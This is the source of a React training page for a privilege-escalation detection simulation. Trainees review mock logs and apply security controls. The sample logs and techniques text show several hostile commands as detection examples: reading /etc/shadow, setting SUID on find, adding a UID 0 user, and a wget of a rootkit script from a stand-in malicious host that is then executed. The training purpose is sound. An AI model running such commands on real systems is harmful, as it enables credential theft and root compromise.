"use client"

import type React from "react"

import { useState, useRef, useEffect } from "react"
import Link from "next/link"
import { ArrowLeft, CheckCircle, Clock, HelpCircle, Search, Shield, Terminal, User } from "lucide-react"

import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Progress } from "@/components/ui/progress"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { toast } from "@/hooks/use-toast"

export default function PrivilegeEscalationScenario() {
  const [currentStep, setCurrentStep] = useState(1)
  const [progress, setProgress] = useState(0)
  const [simulationActive, setSimulationActive] = useState(false)
  const [terminalInput, setTerminalInput] = useState("")
  const [terminalHistory, setTerminalHistory] = useState<string[]>([
    "Welcome to CyberDefender Privilege Escalation Detection Terminal",
    "Type 'help' to see available commands",
  ])
  const [commandHistory, setCommandHistory] = useState<string[]>([])
  const [historyIndex, setHistoryIndex] = useState(-1)
  const [selectedLog, setSelectedLog] = useState<number | null>(null)
  const [analyzedLogs, setAnalyzedLogs] = useState<number[]>([])
  const [detectedVulnerabilities, setDetectedVulnerabilities] = useState(0)
  const [completedTasks, setCompletedTasks] = useState<string[]>([])

  const terminalRef = useRef<HTMLDivElement>(null)
  const inputRef = useRef<HTMLInputElement>(null)

  const totalSteps = 5

  const tasks = [
    "Monitor system logs",
    "Identify suspicious activities",
    "Analyze privilege escalation techniques",
    "Implement security controls",
    "Document findings and recommendations",
  ]

  const systemLogs = [
    {
      id: 1,
      timestamp: "2025-03-16 08:32:15",
      user: "jsmith",
      action: "Login successful",
      details: "Remote login via SSH from IP 192.168.1.45",
      suspicious: false,
    },
    {
      id: 2,
      timestamp: "2025-03-16 08:45:22",
      user: "jsmith",
      action: "Command executed",
      details: "sudo cat /etc/shadow",
      suspicious: true,
      vulnerabilityType: "Unauthorized access attempt",
      explanation: "User is attempting to view password hashes, which requires elevated privileges.",
      mitigation: "Restrict access to sensitive files and implement proper sudo configurations.",
    },
    {
      id: 3,
      timestamp: "2025-03-16 09:12:05",
      user: "system",
      action: "Service started",
      details: "Apache web server started",
      suspicious: false,
    },
    {
      id: 4,
      timestamp: "2025-03-16 09:30:18",
      user: "jsmith",
      action: "File modified",
      details: "Modified /etc/sudoers",
      suspicious: true,
      vulnerabilityType: "Privilege escalation",
      explanation:
        "The sudoers file controls which users can run commands with elevated privileges. Unauthorized modifications could grant a user root access.",
      mitigation: "Implement file integrity monitoring and restrict access to critical system files.",
    },
    {
      id: 5,
      timestamp: "2025-03-16 10:05:33",
      user: "admin",
      action: "User created",
      details: "New user 'backup_svc' created with UID 0",
      suspicious: true,
      vulnerabilityType: "Privilege escalation",
      explanation:
        "Creating a user with UID 0 gives that user root-level privileges. This is a common technique to create a backdoor account.",
      mitigation: "Monitor user creation events and implement controls to prevent creation of users with UID 0.",
    },
    {
      id: 6,
      timestamp: "2025-03-16 10:22:47",
      user: "system",
      action: "Package installed",
      details: "Package 'security-updates' installed",
      suspicious: false,
    },
    {
      id: 7,
      timestamp: "2025-03-16 11:15:09",
      user: "jsmith",
      action: "Command executed",
      details: "chmod u+s /usr/bin/find",
      suspicious: true,
      vulnerabilityType: "SUID binary exploitation",
      explanation:
        "Setting the SUID bit on the find command allows it to be executed with the privileges of the file owner (root). This can be exploited to gain elevated privileges.",
      mitigation: "Regularly audit SUID/SGID binaries and implement controls to prevent unauthorized modifications.",
    },
    {
      id: 8,
      timestamp: "2025-03-16 11:45:22",
      user: "system",
      action: "Service status",
      details: "Database service running normally",
      suspicious: false,
    },
    {
      id: 9,
      timestamp: "2025-03-16 12:10:35",
      user: "jsmith",
      action: "Command executed",
      details: "wget http://malicious-site.com/rootkit.sh -O /tmp/update.sh",
      suspicious: true,
      vulnerabilityType: "Malware download",
      explanation:
        "User is downloading a suspicious script from an external site, potentially a rootkit that could be used for privilege escalation.",
      mitigation:
        "Implement network monitoring, web filtering, and endpoint protection to prevent downloading of malicious content.",
    },
    {
      id: 10,
      timestamp: "2025-03-16 12:15:42",
      user: "jsmith",
      action: "Command executed",
      details: "chmod +x /tmp/update.sh && /tmp/update.sh",
      suspicious: true,
      vulnerabilityType: "Malware execution",
      explanation:
        "User is making the downloaded script executable and running it, which could install a rootkit or other malware to gain elevated privileges.",
      mitigation: "Implement application whitelisting and prevent execution of unauthorized scripts.",
    },
  ]

  const securityControls = [
    {
      id: 1,
      name: "File Integrity Monitoring",
      description: "Monitor critical system files for unauthorized changes",
      implemented: false,
    },
    {
      id: 2,
      name: "Least Privilege Principle",
      description: "Ensure users have only the minimum privileges needed for their tasks",
      implemented: false,
    },
    {
      id: 3,
      name: "SUID/SGID Audit",
      description: "Regularly audit and restrict SUID/SGID binaries",
      implemented: false,
    },
    {
      id: 4,
      name: "Secure Sudo Configuration",
      description: "Configure sudo to limit command execution and log all activities",
      implemented: false,
    },
    {
      id: 5,
      name: "Application Whitelisting",
      description: "Allow only approved applications to run on systems",
      implemented: false,
    },
  ]

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight
    }
  }, [terminalHistory])

  useEffect(() => {
    if (simulationActive && inputRef.current) {
      inputRef.current.focus()
    }
  }, [simulationActive])

  const startSimulation = () => {
    setSimulationActive(true)
    addTerminalLine("System initialized. Starting privilege escalation detection environment...")
    addTerminalLine("Loading system logs...")
    addTerminalLine("Environment ready. You can now begin your investigation.")
    addTerminalLine("Type 'logs' to view system logs.")

    toast({
      title: "Simulation Started",
      description: "Use terminal commands to detect and analyze privilege escalation attempts.",
      duration: 3000,
    })
  }

  const addTerminalLine = (line: string) => {
    setTerminalHistory((prev) => [...prev, line])
  }

  const handleTerminalInput = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter" && terminalInput.trim()) {
      const command = terminalInput.trim()
      processCommand(command)
      setCommandHistory((prev) => [...prev, command])
      setHistoryIndex(-1)
      setTerminalInput("")
    } else if (e.key === "ArrowUp") {
      e.preventDefault()
      if (commandHistory.length > 0) {
        const newIndex = historyIndex < commandHistory.length - 1 ? historyIndex + 1 : historyIndex
        setHistoryIndex(newIndex)
        setTerminalInput(commandHistory[commandHistory.length - 1 - newIndex] || "")
      }
    } else if (e.key === "ArrowDown") {
      e.preventDefault()
      if (historyIndex > 0) {
        const newIndex = historyIndex - 1
        setHistoryIndex(newIndex)
        setTerminalInput(commandHistory[commandHistory.length - 1 - newIndex] || "")
      } else if (historyIndex === 0) {
        setHistoryIndex(-1)
        setTerminalInput("")
      }
    }
  }

  const processCommand = (command: string) => {
    addTerminalLine(`$ ${command}`)

    const args = command.split(" ")
    const cmd = args[0].toLowerCase()

    switch (cmd) {
      case "help":
        showHelp()
        break
      case "logs":
        showLogs()
        break
      case "examine":
        examineLog(Number.parseInt(args[1]))
        break
      case "analyze":
        analyzeLog(Number.parseInt(args[1]))
        break
      case "flag":
        flagSuspicious(Number.parseInt(args[1]))
        break
      case "techniques":
        showTechniques()
        break
      case "controls":
        showSecurityControls()
        break
      case "implement":
        implementControl(Number.parseInt(args[1]))
        break
      case "report":
        generateReport()
        break
      case "tasks":
        showTasks()
        break
      case "clear":
        setTerminalHistory([])
        break
      default:
        addTerminalLine(`Command not found: ${cmd}. Type 'help' for available commands.`)
    }
  }

  const showHelp = () => {
    addTerminalLine("Available commands:")
    addTerminalLine("  help                - Show this help message")
    addTerminalLine("  logs                - Show system logs")
    addTerminalLine("  examine [id]        - Examine a specific log entry")
    addTerminalLine("  analyze [id]        - Analyze a log entry for privilege escalation")
    addTerminalLine("  flag [id]           - Flag a log entry as suspicious")
    addTerminalLine("  techniques          - Show privilege escalation techniques")
    addTerminalLine("  controls            - Show available security controls")
    addTerminalLine("  implement [id]      - Implement a security control")
    addTerminalLine("  report              - Generate a security report")
    addTerminalLine("  tasks               - Show current tasks")
    addTerminalLine("  clear               - Clear terminal")
  }

  const showLogs = () => {
    addTerminalLine("System Logs:")
    addTerminalLine("ID  Timestamp               User     Action             Details")
    addTerminalLine("--  ----------------------  -------  -----------------  -------------------------------")

    systemLogs.forEach((log) => {
      const id = log.id.toString().padEnd(4)
      const timestamp = log.timestamp.padEnd(24)
      const user = log.user.padEnd(9)
      const action = log.action.padEnd(19)
      const details = log.details.length > 30 ? log.details.substring(0, 27) + "..." : log.details

      addTerminalLine(`${id}${timestamp}${user}${action}${details}`)
    })

    if (!completedTasks.includes("Monitor system logs")) {
      setCompletedTasks((prev) => [...prev, "Monitor system logs"])
      toast({
        title: "Task Completed",
        description: "You've successfully monitored system logs.",
        duration: 3000,
      })
    }
  }

  const examineLog = (id: number) => {
    const log = systemLogs.find((l) => l.id === id)

    if (!log) {
      addTerminalLine(`Log entry with ID ${id} not found.`)
      return
    }

    setSelectedLog(id)

    addTerminalLine("=== Log Entry Details ===")
    addTerminalLine(`ID: ${log.id}`)
    addTerminalLine(`Timestamp: ${log.timestamp}`)
    addTerminalLine(`User: ${log.user}`)
    addTerminalLine(`Action: ${log.action}`)
    addTerminalLine(`Details: ${log.details}`)
    addTerminalLine("========================")

    if (!analyzedLogs.includes(id)) {
      setAnalyzedLogs((prev) => [...prev, id])
    }
  }

  const analyzeLog = (id: number) => {
    const log = systemLogs.find((l) => l.id === id)

    if (!log) {
      addTerminalLine(`Log entry with ID ${id} not found.`)
      return
    }

    addTerminalLine("=== Security Analysis ===")
    addTerminalLine(`Analyzing log entry ID ${id}...`)

    setTimeout(() => {
      if (log.suspicious) {
        addTerminalLine(`WARNING: This activity is suspicious!`)
        addTerminalLine(`Vulnerability Type: ${log.vulnerabilityType}`)
        addTerminalLine(`Explanation: ${log.explanation}`)
        addTerminalLine(`Recommended Mitigation: ${log.mitigation}`)
        addTerminalLine("Use 'flag [id]' to mark this entry as a security incident.")
      } else {
        addTerminalLine("No suspicious activity detected in this log entry.")
        addTerminalLine("This appears to be normal system behavior.")
      }
      addTerminalLine("=========================")

      if (!completedTasks.includes("Analyze privilege escalation techniques")) {
        setCompletedTasks((prev) => [...prev, "Analyze privilege escalation techniques"])
        toast({
          title: "Task Completed",
          description: "You've successfully analyzed privilege escalation techniques.",
          duration: 3000,
        })
      }
    }, 1500)
  }

  const flagSuspicious = (id: number) => {
    const log = systemLogs.find((l) => l.id === id)

    if (!log) {
      addTerminalLine(`Log entry with ID ${id} not found.`)
      return
    }

    addTerminalLine(`Flagging log entry ID ${id} as suspicious...`)

    setTimeout(() => {
      if (log.suspicious) {
        addTerminalLine(`Confirmed: This activity is a ${log.vulnerabilityType} attempt.`)
        addTerminalLine("Security incident has been logged and escalated.")

        setDetectedVulnerabilities((prev) => prev + 1)

        if (!completedTasks.includes("Identify suspicious activities")) {
          setCompletedTasks((prev) => [...prev, "Identify suspicious activities"])
          toast({
            title: "Task Completed",
            description: "You've successfully identified suspicious activities.",
            duration: 3000,
          })
        }
      } else {
        addTerminalLine("This activity does not appear to be suspicious.")
        addTerminalLine("No security incident has been logged.")
      }
    }, 1000)
  }

  const showTechniques = () => {
    addTerminalLine("Common Privilege Escalation Techniques:")
    addTerminalLine("")
    addTerminalLine("1. Sudo Exploitation")
    addTerminalLine("   - Misusing sudo privileges")
    addTerminalLine("   - Modifying sudoers file to gain additional privileges")
    addTerminalLine("   - Example: 'sudo cat /etc/shadow', 'sudo vim /etc/sudoers'")
    addTerminalLine("")
    addTerminalLine("2. SUID/SGID Binary Exploitation")
    addTerminalLine("   - Setting the SUID/SGID bit on executables")
    addTerminalLine("   - Exploiting vulnerable SUID binaries")
    addTerminalLine("   - Example: 'chmod u+s /usr/bin/find', 'find / -perm -4000'")
    addTerminalLine("")
    addTerminalLine("3. Kernel Exploits")
    addTerminalLine("   - Exploiting vulnerabilities in the operating system kernel")
    addTerminalLine("   - Using publicly available exploits for unpatched systems")
    addTerminalLine("   - Example: Downloading and running kernel exploit code")
    addTerminalLine("")
    addTerminalLine("4. Password Theft")
    addTerminalLine("   - Accessing password files or memory to obtain credentials")
    addTerminalLine("   - Cracking password hashes to gain access to privileged accounts")
    addTerminalLine("   - Example: 'cat /etc/shadow', memory dumping tools")
    addTerminalLine("")
    addTerminalLine("5. Malicious Scripts/Programs")
    addTerminalLine("   - Running malware designed to gain elevated privileges")
    addTerminalLine("   - Rootkits that modify system behavior to hide activities")
    addTerminalLine("   - Example: Downloading and executing malicious scripts")

    if (!completedTasks.includes("Analyze privilege escalation techniques")) {
      setCompletedTasks((prev) => [...prev, "Analyze privilege escalation techniques"])
      toast({
        title: "Task Completed",
        description: "You've successfully analyzed privilege escalation techniques.",
        duration: 3000,
      })
    }
  }

  const showSecurityControls = () => {
    addTerminalLine("Available Security Controls:")
    addTerminalLine("ID  Name                       Status        Description")
    addTerminalLine("--  -------------------------  ------------  -----------------------------------------")

    securityControls.forEach((control) => {
      const id = control.id.toString().padEnd(4)
      const name = control.name.padEnd(27)
      const status = control.implemented ? "Implemented".padEnd(14) : "Not Implemented".padEnd(14)
      const description = control.description

      addTerminalLine(`${id}${name}${status}${description}`)
    })

    addTerminalLine("")
    addTerminalLine("Use 'implement [id]' to implement a security control.")
  }

  const implementControl = (id: number) => {
    const control = securityControls.find((c) => c.id === id)

    if (!control) {
      addTerminalLine(`Security control with ID ${id} not found.`)
      return
    }

    addTerminalLine(`Implementing security control: ${control.name}...`)

    setTimeout(() => {
      securityControls.forEach((c, index) => {
        if (c.id === id) {
          securityControls[index].implemented = true
        }
      })

      addTerminalLine(`Security control "${control.name}" has been successfully implemented.`)
      addTerminalLine(`Description: ${control.description}`)

      if (!completedTasks.includes("Implement security controls")) {
        setCompletedTasks((prev) => [...prev, "Implement security controls"])
        toast({
          title: "Task Completed",
          description: "You've successfully implemented security controls.",
          duration: 3000,
        })
      }
    }, 1500)
  }

  const generateReport = () => {
    addTerminalLine("Generating security report...")

    setTimeout(() => {
      const implementedControls = securityControls.filter((c) => c.implemented).length

      addTerminalLine("=== PRIVILEGE ESCALATION SECURITY REPORT ===")
      addTerminalLine(`Date: ${new Date().toISOString().split("T")[0]}`)
      addTerminalLine(`Time: ${new Date().toTimeString().split(" ")[0]}`)
      addTerminalLine(`Analyst: Security Trainee`)

      addTerminalLine("")
      addTerminalLine("Summary of Findings:")
      addTerminalLine(`- Total log entries analyzed: ${analyzedLogs.length}`)
      addTerminalLine(`- Suspicious activities detected: ${detectedVulnerabilities}`)
      addTerminalLine(`- Security controls implemented: ${implementedControls}/${securityControls.length}`)

      addTerminalLine("")
      addTerminalLine("Detected Privilege Escalation Attempts:")
      systemLogs
        .filter((log) => log.suspicious)
        .forEach((log) => {
          addTerminalLine(`- ${log.timestamp}: ${log.user} - ${log.action} - ${log.vulnerabilityType}`)
        })

      addTerminalLine("")
      addTerminalLine("Implemented Security Controls:")
      securityControls
        .filter((c) => c.implemented)
        .forEach((control) => {
          addTerminalLine(`- ${control.name}: ${control.description}`)
        })

      addTerminalLine("")
      addTerminalLine("Recommendations:")
      addTerminalLine("1. Implement the principle of least privilege across all systems")
      addTerminalLine("2. Regularly audit user privileges and access rights")
      addTerminalLine("3. Monitor and restrict access to sensitive files and commands")
      addTerminalLine("4. Implement robust logging and alerting for suspicious activities")
      addTerminalLine("5. Conduct regular security awareness training for all users")
      addTerminalLine("==============================================")

      if (!completedTasks.includes("Document findings and recommendations")) {
        setCompletedTasks((prev) => [...prev, "Document findings and recommendations"])
        toast({
          title: "Task Completed",
          description: "You've successfully documented findings and recommendations.",
          duration: 3000,
        })
      }

      // Check if all tasks are completed
      if (completedTasks.length >= 4) {
        toast({
          title: "Scenario Completed!",
          description: "You've successfully completed all required tasks.",
          duration: 5000,
        })
      }
    }, 2000)
  }

  const showTasks = () => {
    addTerminalLine("Current Tasks:")
    tasks.forEach((task, index) => {
      const completed = completedTasks.includes(task)
      addTerminalLine(`${index + 1}. [${completed ? "X" : " "}] ${task}`)
    })
    addTerminalLine(`Progress: ${completedTasks.length}/${tasks.length} tasks completed`)
  }

  const nextStep = () => {
    if (currentStep < totalSteps) {
      setCurrentStep(currentStep + 1)
      setProgress((currentStep / totalSteps) * 100)
    }
  }

  const prevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1)
      setProgress(((currentStep - 2) / totalSteps) * 100)
    }
  }

  return (
    <div className="flex min-h-screen flex-col">
      <header className="bg-background border-b">
        <div className="container flex h-16 items-center px-4 md:px-6">
          <div className="flex items-center gap-2 font-semibold">
            <Shield className="h-6 w-6 text-primary" />
            <span>CyberDefender</span>
          </div>
          <nav className="ml-auto flex gap-4 sm:gap-6">
            <Link href="/dashboard" className="text-sm font-medium hover:underline underline-offset-4">
              Dashboard
            </Link>
            <Link href="/scenarios" className="text-sm font-medium hover:underline underline-offset-4">
              Scenarios
            </Link>
            <Link href="#" className="text-sm font-medium hover:underline underline-offset-4">
              Leaderboard
            </Link>
            <Link href="#" className="text-sm font-medium hover:underline underline-offset-4">
              Resources
            </Link>
          </nav>
          <div className="ml-4">
            <Link href="/profile">
              <Button variant="ghost" size="icon" className="rounded-full">
                <User className="h-5 w-5" />
              </Button>
            </Link>
          </div>
        </div>
      </header>
      <main className="flex-1 container py-8">
        <div className="flex items-center mb-8">
          <Link href="/scenarios">
            <Button variant="ghost" size="sm" className="gap-1">
              <ArrowLeft className="h-4 w-4" /> Back to Scenarios
            </Button>
          </Link>
          <h1 className="text-3xl font-bold ml-4">Privilege Escalation Detection</h1>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          <div className="lg:col-span-2">
            <Card className="mb-6">
              <CardHeader>
                <div className="flex justify-between items-center">
                  <CardTitle>Interactive Terminal</CardTitle>
                  <div className="flex items-center gap-2">
                    <div className="text-sm text-muted-foreground flex items-center gap-1">
                      <Clock className="h-4 w-4" />
                      <span>30:00</span>
                    </div>
                    <TooltipProvider>
                      <Tooltip>
                        <TooltipTrigger asChild>
                          <Button variant="ghost" size="icon">
                            <HelpCircle className="h-4 w-4" />
                          </Button>
                        </TooltipTrigger>
                        <TooltipContent>
                          <p className="max-w-xs">
                            Use terminal commands to detect and analyze privilege escalation attempts. Type 'help' to
                            see available commands.
                          </p>
                        </TooltipContent>
                      </Tooltip>
                    </TooltipProvider>
                  </div>
                </div>
                <CardDescription>Identify and analyze privilege escalation attempts</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="bg-black rounded-md p-4 font-mono text-sm text-green-400 h-[400px] flex flex-col">
                  <div className="flex items-center gap-2 mb-4">
                    <Terminal className="h-5 w-5" />
                    <span className="text-white">CyberDefender Terminal</span>
                  </div>
                  <div className="flex-1 overflow-auto mb-2" ref={terminalRef}>
                    {terminalHistory.map((line, index) => (
                      <div key={index} className="py-0.5 break-words whitespace-pre-wrap">
                        {line}
                      </div>
                    ))}
                  </div>
                  <div className="flex items-center">
                    <span className="mr-2">$</span>
                    <input
                      ref={inputRef}
                      type="text"
                      value={terminalInput}
                      onChange={(e) => setTerminalInput(e.target.value)}
                      onKeyDown={handleTerminalInput}
                      className="flex-1 bg-transparent outline-none"
                      disabled={!simulationActive}
                    />
                  </div>
                </div>
                <div className="mt-4 grid grid-cols-2 md:grid-cols-4 gap-2">
                  <Button
                    size="sm"
                    variant="outline"
                    className="text-xs"
                    onClick={() => processCommand("logs")}
                    disabled={!simulationActive}
                  >
                    logs
                  </Button>
                  <Button
                    size="sm"
                    variant="outline"
                    className="text-xs"
                    onClick={() => processCommand("techniques")}
                    disabled={!simulationActive}
                  >
                    techniques
                  </Button>
                  <Button
                    size="sm"
                    variant="outline"
                    className="text-xs"
                    onClick={() => processCommand("help")}
                    disabled={!simulationActive}
                  >
                    help
                  </Button>
                  <Button
                    size="sm"
                    variant="outline"
                    className="text-xs"
                    onClick={() => processCommand("tasks")}
                    disabled={!simulationActive}
                  >
                    tasks
                  </Button>
                </div>
              </CardContent>
              <CardFooter className="flex justify-between">
                <div className="flex gap-2">
                  <Button onClick={startSimulation} disabled={simulationActive}>
                    Start Simulation
                  </Button>
                  <Button
                    variant="outline"
                    className="gap-1"
                    disabled={!simulationActive}
                    onClick={() => {
                      setTerminalHistory([
                        "Welcome to CyberDefender Privilege Escalation Detection Terminal",
                        "Type 'help' to see available commands",
                      ])
                      setSelectedLog(null)
                      setAnalyzedLogs([])
                      setDetectedVulnerabilities(0)
                      setCompletedTasks([])
                      securityControls.forEach((control, index) => {
                        securityControls[index].implemented = false
                      })
                      setSimulationActive(false)
                      toast({
                        title: "Simulation Reset",
                        description: "The simulation has been reset.",
                        duration: 3000,
                      })
                    }}
                  >
                    <Search className="h-4 w-4" />
                    Reset
                  </Button>
                </div>
                <div className="text-sm">
                  Tasks Completed:{" "}
                  <span className="font-bold">
                    {completedTasks.length}/{tasks.length}
                  </span>
                </div>
              </CardFooter>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle>
                  Step {currentStep} of {totalSteps}:{" "}
                  {["Introduction", "Detection", "Analysis", "Mitigation", "Prevention"][currentStep - 1]}
                </CardTitle>
                <CardDescription>Progress: {Math.round(progress)}%</CardDescription>
                <Progress value={progress} className="h-2" />
              </CardHeader>
              <CardContent>
                {currentStep === 1 && (
                  <div className="space-y-4">
                    <h3 className="text-lg font-medium">Welcome to the Privilege Escalation Detection Scenario</h3>
                    <p>
                      In this simulation, you will learn how to detect and analyze privilege escalation attempts.
                      Privilege escalation occurs when a user gains access to resources or capabilities that should be
                      restricted from them, effectively elevating their privileges on a system.
                    </p>
                    <div className="bg-muted p-4 rounded-md">
                      <h4 className="font-medium mb-2">Getting Started:</h4>
                      <ol className="list-decimal pl-5 space-y-1">
                        <li>Click "Start Simulation" to begin</li>
                        <li>Type "help" to see available commands</li>
                        <li>Type "logs" to view system logs</li>
                        <li>Use "examine [id]" to view details of a specific log entry</li>
                        <li>Use "analyze [id]" to analyze suspicious activities</li>
                      </ol>
                    </div>
                  </div>
                )}
                {currentStep === 2 && (
                  <div className="space-y-4">
                    <h3 className="text-lg font-medium">Detection Phase</h3>
                    <p>
                      Start by examining the system logs for signs of privilege escalation attempts. Look for suspicious
                      activities that might indicate someone is trying to gain elevated privileges.
                    </p>
                    <div className="bg-muted p-4 rounded-md">
                      <h4 className="font-medium mb-2">Key Commands:</h4>
                      <ul className="list-disc pl-5 space-y-1">
                        <li>
                          <code>logs</code> - View system logs
                        </li>
                        <li>
                          <code>examine [id]</code> - View details of a specific log entry
                        </li>
                        <li>
                          <code>flag [id]</code> - Mark a log entry as suspicious
                        </li>
                      </ul>
                    </div>
                    <p>Common indicators of privilege escalation include:</p>
                    <ul className="list-disc pl-6 space-y-1">
                      <li>Unauthorized access to sensitive files (e.g., /etc/shadow, /etc/sudoers)</li>
                      <li>Creation of users with elevated privileges</li>
                      <li>Modification of permission settings on critical files or binaries</li>
                      <li>Execution of commands that require elevated privileges</li>
                      <li>Installation of suspicious software or scripts</li>
                    </ul>
                  </div>
                )}
                {currentStep === 3 && (
                  <div className="space-y-4">
                    <h3 className="text-lg font-medium">Analysis Phase</h3>
                    <p>
                      Once you've identified suspicious activities, analyze them to understand the privilege escalation
                      techniques being used and their potential impact.
                    </p>
                    <div className="bg-muted p-4 rounded-md">
                      <h4 className="font-medium mb-2">Key Commands:</h4>
                      <ul className="list-disc pl-5 space-y-1">
                        <li>
                          <code>analyze [id]</code> - Analyze a log entry for privilege escalation
                        </li>
                        <li>
                          <code>techniques</code> - Learn about common privilege escalation techniques
                        </li>
                      </ul>
                    </div>
                    <p>
                      Understanding the techniques used by attackers will help you implement effective countermeasures
                      and prevent future attacks.
                    </p>
                  </div>
                )}
                {currentStep === 4 && (
                  <div className="space-y-4">
                    <h3 className="text-lg font-medium">Mitigation Phase</h3>
                    <p>
                      After identifying privilege escalation attempts, it's important to implement security controls to
                      mitigate the threats and prevent future attacks.
                    </p>
                    <div className="bg-muted p-4 rounded-md">
                      <h4 className="font-medium mb-2">Key Commands:</h4>
                      <ul className="list-disc pl-5 space-y-1">
                        <li>
                          <code>controls</code> - View available security controls
                        </li>
                        <li>
                          <code>implement [id]</code> - Implement a security control
                        </li>
                      </ul>
                    </div>
                    <p>Effective security controls for privilege escalation include:</p>
                    <ul className="list-disc pl-6 space-y-1">
                      <li>Implementing the principle of least privilege</li>
                      <li>Regular auditing of user privileges and access rights</li>
                      <li>Monitoring and restricting access to sensitive files and commands</li>
                      <li>Implementing file integrity monitoring</li>
                      <li>Restricting SUID/SGID binaries</li>
                    </ul>
                  </div>
                )}
                {currentStep === 5 && (
                  <div className="space-y-4">
                    <h3 className="text-lg font-medium">Prevention Phase</h3>
                    <p>
                      The final step is to document your findings and implement long-term prevention strategies to
                      protect systems from privilege escalation attacks.
                    </p>
                    <div className="bg-muted p-4 rounded-md">
                      <h4 className="font-medium mb-2">Key Command:</h4>
                      <ul className="list-disc pl-5 space-y-1">
                        <li>
                          <code>report</code> - Generate a comprehensive security report
                        </li>
                      </ul>
                    </div>
                    <p>Long-term prevention strategies include:</p>
                    <ul className="list-disc pl-6 space-y-1">
                      <li>Regular security updates and patches</li>
                      <li>Continuous monitoring and logging</li>
                      <li>Security awareness training</li>
                      <li>Regular security assessments and penetration testing</li>
                      <li>Implementation of defense-in-depth strategies</li>
                    </ul>
                  </div>
                )}
              </CardContent>
              <CardFooter className="flex justify-between">
                <Button onClick={prevStep} disabled={currentStep === 1} variant="outline">
                  Previous
                </Button>
                <Button onClick={nextStep} disabled={currentStep === totalSteps}>
                  Next
                </Button>
              </CardFooter>
            </Card>
          </div>

          <div>
            <Card className="mb-6">
              <CardHeader>
                <CardTitle>Scenario Details</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  <div className="flex items-center justify-between">
                    <span className="text-sm font-medium">Difficulty:</span>
                    <span className="bg-orange-500/10 text-orange-500 text-xs font-medium px-2 py-1 rounded-full">
                      Intermediate
                    </span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-sm font-medium">Estimated Time:</span>
                    <span className="text-sm">30-45 minutes</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-sm font-medium">Category:</span>
                    <span className="text-sm">System Security</span>
                  </div>
                  <div className="flex items-center justify-between">
                    <span className="text-sm font-medium">Skills:</span>
                    <div className="flex flex-wrap gap-1 justify-end">
                      <span className="bg-muted text-xs px-2 py-1 rounded-full">Detection</span>
                      <span className="bg-muted text-xs px-2 py-1 rounded-full">Analysis</span>
                      <span className="bg-muted text-xs px-2 py-1 rounded-full">Mitigation</span>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="mb-6">
              <CardHeader>
                <CardTitle>Tasks</CardTitle>
              </CardHeader>
              <CardContent>
                <ul className="space-y-2">
                  {tasks.map((task, index) => (
                    <li key={index} className="flex items-start gap-2">
                      {completedTasks.includes(task) ? (
                        <CheckCircle className="h-5 w-5 text-green-500 mt-0.5 shrink-0" />
                      ) : (
                        <div className="h-5 w-5 border rounded-full mt-0.5 shrink-0" />
                      )}
                      <span className={completedTasks.includes(task) ? "text-green-500" : ""}>{task}</span>
                    </li>
                  ))}
                </ul>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle>Learning Objectives</CardTitle>
              </CardHeader>
              <CardContent>
                <ul className="space-y-2">
                  <li className="flex items-start gap-2">
                    <CheckCircle className="h-5 w-5 text-green-500 mt-0.5 shrink-0" />
                    <span>Identify privilege escalation indicators in system logs</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <CheckCircle className="h-5 w-5 text-green-500 mt-0.5 shrink-0" />
                    <span>Recognize common privilege escalation techniques</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <CheckCircle className="h-5 w-5 text-green-500 mt-0.5 shrink-0" />
                    <span>Analyze suspicious activities to determine their impact</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <CheckCircle className="h-5 w-5 text-green-500 mt-0.5 shrink-0" />
                    <span>Implement appropriate security controls</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <CheckCircle className="h-5 w-5 text-green-500 mt-0.5 shrink-0" />
                    <span>Document findings and recommend preventive measures</span>
                  </li>
                </ul>
              </CardContent>
            </Card>
          </div>
        </div>
      </main>
      <footer className="border-t bg-muted/40">
        <div className="container py-6 text-center text-sm text-muted-foreground">
          © 2025 CyberDefender. All rights reserved.
        </div>
      </footer>
    </div>
  )
}

